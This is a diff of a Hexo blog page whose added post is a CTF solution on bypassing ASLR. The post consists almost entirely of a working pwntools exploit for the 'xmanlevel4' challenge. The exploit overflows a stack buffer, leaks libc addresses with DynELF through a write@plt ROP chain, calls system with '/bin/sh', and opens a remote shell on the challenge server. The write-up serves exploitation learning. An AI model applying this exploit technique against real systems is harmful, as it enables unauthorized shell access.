@@ -70,7 +70,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="pwn,CTF,ASLR,DynELF," />
 
 
 
@@ -86,13 +86,16 @@
 
 
 
+<meta name="description" content="exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote(&apos;pwn2.jarvisoj.com&apos;, 9880)p = remote(&apos;218.2.197.235&apos;,20433)elf = ELF(&apos;./xman">
 <meta property="og:type" content="article">
 <meta property="og:title" content="栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址">
 <meta property="og:url" content="http://yoursite.com/2017/02/16/栈溢出学习之bypass-ASLR-利用DynELF模块leak出内存地址/index.html">
 <meta property="og:site_name" content="Chybeta">
-<meta property="og:updated_time" content="2017-02-16T14:23:12.981Z">
+<meta property="og:description" content="exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote(&apos;pwn2.jarvisoj.com&apos;, 9880)p = remote(&apos;218.2.197.235&apos;,20433)elf = ELF(&apos;./xman">
+<meta property="og:updated_time" content="2017-02-17T14:41:06.414Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="栈溢出学习之bypass ASLR:利用DynELF模块leak出内存地址">
+<meta name="twitter:description" content="exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#p = remote(&apos;pwn2.jarvisoj.com&apos;, 9880)p = remote(&apos;218.2.197.235&apos;,20433)elf = ELF(&apos;./xman">
 
 
 
@@ -342,6 +345,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -388,7 +413,8 @@
       
 
       
-        
+        <p>exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#p = remote('pwn2.jarvisoj.com', 9880)</span></div><div class="line">p = remote(<span class="string">'218.2.197.235'</span>,<span class="number">20433</span>)</div><div class="line">elf = ELF(<span class="string">'./xmanlevel4'</span>)</div><div class="line"></div><div class="line">writeplt = elf.symbols[<span class="string">'write'</span>]</div><div class="line">readplt = elf.symbols[<span class="string">'read'</span>]</div><div class="line">vulnaddr = <span class="number">0x804844b</span></div><div class="line">bssaddr = elf.bss(<span class="number">0x200</span>)</div><div class="line">pppraddr = <span class="number">0x8048509</span></div><div class="line">staraddr =  <span class="number">0x8048350</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	payload = <span class="string">'a'</span>*<span class="number">140</span></div><div class="line">	payload += p32(writeplt)</div><div class="line">	payload += p32(vulnaddr)</div><div class="line">	payload += p32(<span class="number">1</span>)</div><div class="line">	payload += p32(address)</div><div class="line">	payload += p32(<span class="number">4</span>)</div><div class="line">	p.send(payload)</div><div class="line">	data = p.recv(<span class="number">4</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">"%#x =&gt; %s "</span> % (address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line">dynelf =  DynELF(leak,elf=ELF(<span class="string">'./xmanlevel4'</span>))</div><div class="line">sysaddr = dynelf.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"system address is "</span> + hex(sysaddr)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------"</span></div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">140</span></div><div class="line">payload1 += p32(readplt)</div><div class="line">payload1 += p32(pppraddr)</div><div class="line">payload1 += p32(<span class="number">0</span>)</div><div class="line">payload1 += p32(bssaddr)</div><div class="line">payload1 += p32(<span class="number">8</span>)</div><div class="line">payload1 += p32(sysaddr)</div><div class="line">payload1 += p32(<span class="number">1</span>)</div><div class="line">payload1 += p32(bssaddr)</div><div class="line"></div><div class="line">p.send(payload1)</div><div class="line">p.send(<span class="string">'/bin/sh\0'</span>)</div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+
       
     </div>
 
@@ -408,6 +434,18 @@
 
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/ASLR/" rel="tag"># ASLR</a>
+          
+            <a href="/tags/DynELF/" rel="tag"># DynELF</a>
+          
+        </div>
       
 
       
@@ -500,7 +538,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -509,7 +547,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
